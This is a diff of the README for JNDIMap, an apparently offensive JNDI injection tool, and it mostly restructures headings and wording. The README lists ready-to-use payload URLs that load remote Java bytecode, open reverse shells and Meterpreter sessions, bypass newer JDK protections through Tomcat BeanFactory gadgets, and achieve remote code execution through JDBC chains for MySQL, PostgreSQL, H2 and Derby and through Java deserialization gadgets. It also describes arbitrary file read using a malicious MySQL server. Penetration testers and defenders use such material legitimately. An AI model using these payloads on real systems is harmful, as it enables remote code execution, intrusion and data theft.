@@ -30,21 +30,21 @@ Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-s <ldaps
 
 `-h`: show usage
 
-## JNDI URLs
+## Notes on JNDI URL
 
 Please note that all the Base64 passed in is **Base64 URL encoded**, i.e. replace `+` and `/` with `-` and `_`
 
 Most parameters support automatic Base64 URL decoding, that is, you can directly pass in plain text (command/IP/port/URL) or Base64 URL encoded content (some routes only accept Base64 URL encoded parameters, which will be specially noted below)
 
-The following routes support RMI, LDAP and LDAPS protocols except `/Deserialize/*` (LDAP(s) deserialization)
+The following routes support RMI, LDAP and LDAPS protocols except `/Deserialize/*` (LDAP deserialization)
 
 For the RMI protocol, simply replace `ldap://127.0.0.1:1389/` with `rmi://127.0.0.1:1099/` in the payload url
 
 For the LDAPS protocol, simply replace `ldap://127.0.0.1:1389/` with `ldaps://127.0.0.1:1636/` in the payload url
 
-### Basic
+## Basic
 
-Directly load remote classes via JNDI Reference
+Directly load remote Java bytecode via JNDI Reference class 
 
 The Java version must be less than 8u121 (RMI protocol) or 8u191 (LDAP protocol)
 
@@ -57,7 +57,7 @@ ldap://127.0.0.1:1389/Basic/DNSLog/eHh4LmRuc2xvZy5jbg==
 ldap://127.0.0.1:1389/Basic/Command/open -a Calculator
 ldap://127.0.0.1:1389/Basic/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 
-# load custom class bytecode
+# load custom Java bytecode
 
 # load via URL parameters
 ldap://127.0.0.1:1389/Basic/FromUrl/<base64-url-encoded-java-bytecode>
@@ -65,63 +65,112 @@ ldap://127.0.0.1:1389/Basic/FromUrl/<base64-url-encoded-java-bytecode>
 ldap://127.0.0.1:1389/Basic/FromFile/Evil.class # the path is relative to the current directory
 ldap://127.0.0.1:1389/Basic/FromFile/<base64-url-encoded-path-to-evil-class-file>
 
-# native reverse shell (Windows supported)
+# spawn reverse shell (supports Windows)
 ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Basic/ReverseShell/MTI3LjAuMC4x/NDQ0NA==
 
-# native Meterpreter (java/meterpreter/reverse_tcp)
+# spawn Meterpreter (java/meterpreter/reverse_tcp)
 ldap://127.0.0.1:1389/Basic/Meterpreter/127.0.0.1/4444
 ldap://127.0.0.1:1389/Basic/Meterpreter/MTI3LjAuMC4x/NDQ0NA==
 ```
 
-### Bypass
+## BeanFactory Bypass
 
-Use the following methods to bypass higher-version JDK restrictions, support all Basic features
+Bypass restrictions on higher JDK versions using BeanFactory. The Tomcat version must be earlier than 8.5.79 or 9.0.63
+
+Supported bypass methods:
 
 - Tomcat ELProcessor
 - Groovy ClassLoader/Shell
-- SnakeYaml
 - XStream
-- MVEL
+- SnakeYaml
 - BeanShell
+- MVEL
+- MLet
+- NativeLibLoader
 
-All of the above methods rely on BeanFactory, so the Tomcat version must be less than 8.5.79 or 9.0.63
+*Except for MLet and NativeLibLoader, all of the above methods support all Basic module features.*
+
+### Tomcat ELProcessor
+
+Use `javax.el.ELProcessor` to execute EL expressions
 
 ```bash
 # Tomcat Bypass
 ldap://127.0.0.1:1389/TomcatBypass/Command/open -a Calculator
+```
 
-# Groovy Bypass
+### Groovy ClassLoader/Shell
+
+Use `groovy.lang.GroovyClassLoader` and `groovy.lang.GroovyShell` to execute Groovy scripts
+
+```bash
+# GroovyClassLoader
 ldap://127.0.0.1:1389/GroovyClassLoader/Command/open -a Calculator
-ldap://127.0.0.1:1389/GroovyShell/Command/open -a Calculator
 
+# GroovyShell
+ldap://127.0.0.1:1389/GroovyShell/Command/open -a Calculator
+```
+### XStream
+
+Use XStream deserialization to achieve RCE
+
+The deserialization part uses UIDefaults + SwingLazyValue to trigger the following gadgets in sequence:
+
+- Arbitrary file write: `com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename`
+- XSLT Loading: `com.sun.org.apache.xalan.internal.xslt.Process._main`
+
+The XSLT payload uses Spring's reflection library to call defineClass, so it requires a Spring environment
+
+```bash
+# XStream Bypass (depends on Spring)
+# Based on arbitrary file write + XSLT loading, there is a probability of failure due to the order of precedence, so you need to try several times
+ldap://127.0.0.1:1389/XStream/Command/open -a Calculator
+````
+
+### SnakeYaml
+
+Use SnakeYaml deserialization to achieve RCE
+
+The deserialization part uses URLClassLoader to load the `javax.script.ScriptEngineManager` SPI implementation class, which internally executes JavaScript code through the ScriptEngine
+
+```bash
 # SnakeYaml Bypass
 ldap://127.0.0.1:1389/SnakeYaml/Command/open -a Calculator
+```
 
-# XStream Bypass (depends on Spring)
-# Based on arbitrary file writing + XSLT loading, there is a probability of failure due to the order of precedence, so you need to try several times
-ldap://127.0.0.1:1389/XStream/Command/open -a Calculator
+### BeanShell
 
-# MVEL Bypass
-ldap://127.0.0.1:1389/MVEL/Command/open -a Calculator
+Use `bsh.Interpreter.eval` to execute BeanShell scripts
 
+```bash
 # BeanShell Bypass
 ldap://127.0.0.1:1389/BeanShell/Command/open -a Calculator
 ```
 
+### MVEL
+
+Use `org.mvel2.sh.ShellSession.exec` to execute MVEL expressions
+
+```bash
+# MVEL Bypass
+ldap://127.0.0.1:1389/MVEL/Command/open -a Calculator
+```
+
 ### MLet
 
-Detect classes in classpath via MLet
+Use loadClass and addURL methods in `javax.management.loading.MLet` to detect classes in the classpath
 
 If the class `com.example.TestClass` exists, the HTTP server will receive a `/com/example/TestClass_exists.class` request
 
 ```bash
+# MLet
 ldap://127.0.0.1:1389/MLet/com.example.TestClass
 ```
 
 ### NativeLibLoader
 
-Load native library on the target server via NativeLibLoader
+Use `com.sun.glass.utils.NativeLibLoader.loadLibrary` method to load the local library on the target server
 
 You need to write a dll/so/dylib to the target machine in advance by other methods (e.g. file upload)
 
@@ -130,6 +179,7 @@ Please note that the path passed in is an absolute path and cannot contain the f
 For example: if `/tmp/evil.so` exists on the server, the path is `/tmp/evil`
 
 ```bash
+# NativeLibLoader
 ldap://127.0.0.1:1389/NativeLibLoader/<base64-url-encoded-path-to-native-library>
 ```
 
@@ -155,7 +205,7 @@ gcc -shared -fPIC exp.c -o exp.dylib
 gcc -shared -fPIC exp.c -o exp.so
 ```
 
-### JDBC RCE
+## JDBC RCE
 
 Support JDBC RCE for the following database connection pools
 
@@ -165,11 +215,19 @@ Support JDBC RCE for the following database connection pools
 - Alibaba Druid
 - HikariCP
 
-Replace Factory in the URL with one of CommonsDBCP1/CommonsDBCP2/TomcatDBCP1/TomcatDBCP2/TomcatJDBC/Druid/HikariCP
+Replace the `Factory` in the URL with one of the following:
 
-#### MySQL
+- CommonsDBCP1
+- CommonsDBCP2
+- TomcatDBCP1
+- TomcatDBCP2
+- TomcatJDBC
+- Druid
+- HikariCP
 
-**MySQL JDBC Deserialization**
+### MySQL
+
+#### MySQL JDBC Deserialization RCE
 
 ```bash
 # detectCustomCollations (5.1.19-5.1.48, 6.0.2-6.0.6)
@@ -205,7 +263,7 @@ jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.
 jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=test
 ```
 
-**MySQL Client Arbitrary File Read**
+#### MySQL Client Arbitrary File Read
 
 ```bash
 # all versions
@@ -227,31 +285,31 @@ The above two methods require a malicious MySQL server to be used
 
 [https://github.com/fnmsd/MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)
 
-#### PostgreSQL
+### PostgreSQL
 
 Instantiate ClassPathXmlApplicationContext via the socketFactory and socketFactoryArg parameters of the PostgreSQL JDBC URL to achieve RCE
 
 ```bash
-# command execution
+# execute command
 ldap://127.0.0.1:1389/Factory/PostgreSQL/Command/open -a Calculator
 
-# native reverse shell
+# reverse shell
 ldap://127.0.0.1:1389/Factory/PostgreSQL/ReverseShell/127.0.0.1/4444
 ````
 
-#### H2
+### H2
 
-Execute SQL statements via the INIT parameter of the H2 JDBC URL, support command execution and native reverse shell
+Execute SQL statements via the INIT parameter of the H2 JDBC URL, support command execution and reverse shell
 
 Support three methods: CREATE ALIAS + Java/Groovy, CREATE TRIGGER + JavaScript
 
 ```bash
-# command execution
+# execute command
 ldap://127.0.0.1:1389/Factory/H2/Java/Command/open -a Calculator
 ldap://127.0.0.1:1389/Factory/H2/Groovy/Command/open -a Calculator
 ldap://127.0.0.1:1389/Factory/H2/JavaScript/Command/open -a Calculator
 
-# native reverse shell
+# reverse shell
 ldap://127.0.0.1:1389/Factory/H2/Java/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Factory/H2/Groovy/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Factory/H2/JavaScript/ReverseShell/127.0.0.1/4444
@@ -271,17 +329,17 @@ ldap://127.0.0.1:1389/Factory/H2/JRE/Spring/Command/open -a Calculator
 ldap://127.0.0.1:1389/Factory/H2/JRE/Spring/ReverseShell/127.0.0.1/4444
 ```
 
-#### Derby
+### Derby
 
-**Derby SQL RCE**
+#### Derby SQL RCE
 
-Support executing commands and native reverse shell
+Support executing commands and reverse shell
 
 ```bash
 # 1. load remote jar and create procedures (will automatically create the database)
 ldap://127.0.0.1:1389/Factory/Derby/Install/<database>
 
-# 2. execute command/native reverse shell
+# 2. execute command/reverse shell
 ldap://127.0.0.1:1389/Factory/Derby/Command/<database>/open -a Calculator
 ldap://127.0.0.1:1389/Factory/Derby/ReverseShell/<database>/ReverseShell/127.0.0.1/4444
 
@@ -301,7 +359,7 @@ ldap://127.0.0.1:1389/HikariCP/Derby/AddClassPath/<database>
 # 3. create a procedure to execute commands
 ldap://127.0.0.1:1389/HikariCP/Derby/CreateCmdProc/<database>
 
-# 4. create a procedure to execute native reverse shell
+# 4. create a procedure to execute reverse shell
 ldap://127.0.0.1:1389/HikariCP/Derby/CreateRevProc/<database>
 
 # subsequent JNDI URL is the same as above
@@ -311,7 +369,7 @@ In order to prevent malicious jars from landing, JNDIMap chooses to use the `jdb
 
 Therefore, it is best not to execute the Install/InstallJar route multiple times, and remember to Drop the database to release memory
 
-**Derby Master-Slave Replication Deserialization RCE**
+#### Derby Master-Slave Replication Deserialization RCE
 
 Although JNDI itself supports deserialization, it is not very meaningful, and may be useful in some extreme scenarios (e.g. filtering the LDAP protocol and only supporting RMI)
 
@@ -340,15 +398,17 @@ Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>
 
 `-h`: show usage
 
-### Deserialize
+## LDAP Deserialization
 
-Supports Java deserialization via LDAP(s) protocol (RMI protocol is not supported)
+Supports Java deserialization via LDAP and LDAP protocols (RMI protocol is not supported)
 
 JNDIMap has built-in the following gadgets, and also supports custom data deserialization
 
 - CommonsCollections K1-K4
-- CommonsBeanutils (1.8.3 + 1.9.4)
-- Fastjson (1.2.x + 2.0.x)
+- CommonsBeanutils183
+- CommonsBeanutils194
+- Fastjson1 (1.2.x)
+- Fastjson2 (2.0.x)
 - Jackson
 
 ```bash
@@ -360,7 +420,7 @@ ldap://127.0.0.1:1389/Deserialize/FromUrl/<base64-url-encoded-serialized-data>
 ldap://127.0.0.1:1389/Deserialize/FromFile/payload.ser # the path is relative to the current directory
 ldap://127.0.0.1:1389/Deserialize/FromFile/<base64-url-encoded-path-to-serialized-data>
 
-# CommonsCollectionsK1 deserialization (3.1 + TemplatesImpl), supports command execution and native reverse shell
+# CommonsCollectionsK1 deserialization (3.1 + TemplatesImpl), supports command execution and reverse shell
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/ReverseShell/127.0.0.1/4444
 
@@ -374,7 +434,7 @@ ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/open -a Calculato
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculator
 
 # CommonsBeanutils deserialization
-# No need for commons-collections dependency, use TemplatesImpl, support command execution and native reverse shell
+# No need for commons-collections dependency, use TemplatesImpl, support command execution and reverse shell
 # According to the different serialVersionUID of BeanComparator, it is divided into two versions: 1.8.3 and 1.9.4
 
 # 1.8.3
@@ -385,12 +445,12 @@ ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/ReverseShell/127.0.0.1/444
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/ReverseShell/127.0.0.1/4444
 
-# Jackson native deserialization
+# Jackson deserialization
 # Use JdkDynamicAopProxy to optimize instability issues, need spring-aop dependency
 ldap://127.0.0.1:1389/Deserialize/Jackson/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Jackson/ReverseShell/127.0.0.1/4444
 
-# Fastjson native deserialization
+# Fastjson deserialization
 
 # Fastjson1: all versions (1.2.x)
 ldap://127.0.0.1:1389/Deserialize/Fastjson1/Command/open -a Calculator
@@ -401,7 +461,7 @@ ldap://127.0.0.1:1389/Deserialize/Fastjson2/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Fastjson2/ReverseShell/127.0.0.1/4444
 ```
 
-### Script
+## Script
 
 JNDIMap supports writing custom JNDI payload scripts with the Nashorn JavaScript engine (based on ES5)
 
@@ -449,7 +509,7 @@ Then trigger via any JNDI URL
 ldap://127.0.0.1:1389/x
 ```
 
-### useReferenceOnly
+## useReferenceOnly
 
 For JNDI injection of the LDAP(s) protocol, if you want to use ObjectFactory to bypass it, the existing methods are to set the javaSerializedData attribute returned by the LDAP protocol to the serialized data of the Reference object
 
